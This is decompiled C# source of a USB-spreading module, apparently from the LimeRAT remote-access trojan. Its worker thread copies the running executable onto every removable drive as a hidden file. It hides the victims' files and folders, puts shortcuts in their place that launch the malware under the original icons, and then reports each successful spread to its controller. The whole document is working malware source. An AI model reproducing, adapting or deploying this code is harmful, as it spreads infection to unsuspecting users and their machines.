using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Lime;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class SPUSB
{
	public static string ExeName = Core.RG;

	private static Thread H;

	public static void Enable()
	{
		H = new Thread(WorkThread);
		H.Start();
	}

	public static void Disable()
	{
		H.Abort();
	}

	public static void WorkThread()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		string text = default(string);
		DriveInfo[] drives = default(DriveInfo[]);
		object objectValue2 = default(object);
		DriveInfo[] array = default(DriveInfo[]);
		int num5 = default(int);
		DriveInfo driveInfo = default(DriveInfo);
		string[] files = default(string[]);
		int num6 = default(int);
		string text2 = default(string);
		int num7 = default(int);
		string[] directories = default(string[]);
		string text3 = default(string);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_000a;
					case 977:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_0012;
							case 4:
								goto IL_002a;
							case 5:
								goto IL_0046;
							case 6:
								goto IL_0063;
							case 7:
								goto IL_0073;
							case 8:
								goto IL_0095;
							case 9:
								goto IL_00a9;
							case 10:
								goto IL_00cc;
							case 12:
								goto IL_00ee;
							case 13:
								goto IL_0105;
							case 16:
								goto IL_0115;
							case 17:
								goto IL_013c;
							case 18:
								goto IL_0159;
							case 19:
								goto IL_0180;
							case 14:
							case 15:
								goto IL_01a0;
							case 21:
								goto IL_01db;
							case 22:
								goto IL_01f6;
							case 23:
								goto IL_0202;
							case 24:
								goto IL_020d;
							case 25:
								goto IL_023c;
							case 26:
								goto IL_0263;
							case 27:
								goto IL_0280;
							case 28:
								goto IL_02af;
							case 29:
								goto IL_02ca;
							case 30:
								goto IL_0306;
							case 31:
							case 32:
								goto IL_031c;
							case 11:
							case 20:
								goto IL_032a;
							default:
								goto end_IL_0001;
							case 33:
								goto end_IL_0001_2;
							}
							goto default;
						}
						IL_0280:
						num = 27;
						NewLateBinding.LateSet(objectValue, (Type)null, "IconLocation", new object[1] { Environment.GetEnvironmentVariable("windir") + "\\System32\\Shell32.dll, 3" }, (string[])null, (Type[])null);
						goto IL_02af;
						IL_0263:
						num = 26;
						NewLateBinding.LateSet(objectValue, (Type)null, "WorkingDirectory", new object[1] { text }, (string[])null, (Type[])null);
						goto IL_0280;
						IL_000a:
						num = 2;
						drives = DriveInfo.GetDrives();
						goto IL_0012;
						IL_0012:
						num = 3;
						objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
						goto IL_002a;
						IL_002a:
						num = 4;
						array = drives;
						num5 = 0;
						goto IL_0032;
						IL_0032:
						if (num5 < array.Length)
						{
							driveInfo = array[num5];
							goto IL_0046;
						}
						goto end_IL_0001_2;
						IL_02af:
						num = 28;
						NewLateBinding.LateCall(objectValue, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						goto IL_02ca;
						IL_0046:
						num = 5;
						if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
						{
							goto IL_0063;
						}
						goto IL_031c;
						IL_02ca:
						num = 29;
						Core.Send("MSG" + Core.Y + "USB was detected! " + Core.EXE + " spreaded successfully!");
						goto IL_0306;
						IL_0063:
						num = 6;
						text = driveInfo.RootDirectory.ToString();
						goto IL_0073;
						IL_0073:
						num = 7;
						File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text + ExeName);
						goto IL_0095;
						IL_0095:
						num = 8;
						File.SetAttributes(text + ExeName, FileAttributes.Hidden);
						goto IL_00a9;
						IL_00a9:
						num = 9;
						files = Directory.GetFiles(text);
						num6 = 0;
						goto IL_00b8;
						IL_00b8:
						if (num6 < files.Length)
						{
							text2 = files[num6];
							goto IL_00cc;
						}
						goto IL_01db;
						IL_0306:
						num = 30;
						num7++;
						goto IL_030f;
						IL_00cc:
						num = 10;
						if (Operators.CompareString(Path.GetFileNameWithoutExtension(text2), Path.GetFileNameWithoutExtension(ExeName), false) != 0)
						{
							goto IL_00ee;
						}
						goto IL_032a;
						IL_00ee:
						num = 12;
						if (!text2.Contains(".lnk"))
						{
							goto IL_0105;
						}
						goto IL_01a0;
						IL_0105:
						num = 13;
						File.SetAttributes(text2, FileAttributes.Hidden);
						goto IL_01a0;
						IL_01a0:
						num = 15;
						objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "CreateShortcut", new object[1] { text + Path.GetFileNameWithoutExtension(text2) + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
						goto IL_0115;
						IL_0115:
						num = 16;
						NewLateBinding.LateSet(objectValue, (Type)null, "TargetPath", new object[1] { text + ExeName }, (string[])null, (Type[])null);
						goto IL_013c;
						IL_013c:
						num = 17;
						NewLateBinding.LateSet(objectValue, (Type)null, "WorkingDirectory", new object[1] { text }, (string[])null, (Type[])null);
						goto IL_0159;
						IL_0159:
						num = 18;
						NewLateBinding.LateSet(objectValue, (Type)null, "IconLocation", new object[1] { text2 + ", 0" }, (string[])null, (Type[])null);
						goto IL_0180;
						IL_0180:
						num = 19;
						NewLateBinding.LateCall(objectValue, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						goto IL_032a;
						IL_032a:
						num = 20;
						num6++;
						goto IL_00b8;
						IL_01db:
						num = 21;
						directories = Directory.GetDirectories(text);
						num7 = 0;
						goto IL_030f;
						IL_030f:
						if (num7 < directories.Length)
						{
							text3 = directories[num7];
							goto IL_01f6;
						}
						goto IL_031c;
						IL_031c:
						num = 32;
						num5++;
						goto IL_0032;
						IL_01f6:
						num = 22;
						directoryInfo = new DirectoryInfo(text3);
						goto IL_0202;
						IL_0202:
						num = 23;
						directoryInfo.Attributes = FileAttributes.Hidden;
						goto IL_020d;
						IL_020d:
						num = 24;
						objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "CreateShortcut", new object[1] { text3 + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
						goto IL_023c;
						IL_023c:
						num = 25;
						NewLateBinding.LateSet(objectValue, (Type)null, "TargetPath", new object[1] { text + ExeName }, (string[])null, (Type[])null);
						goto IL_0263;
						end_IL_0001:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 977;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
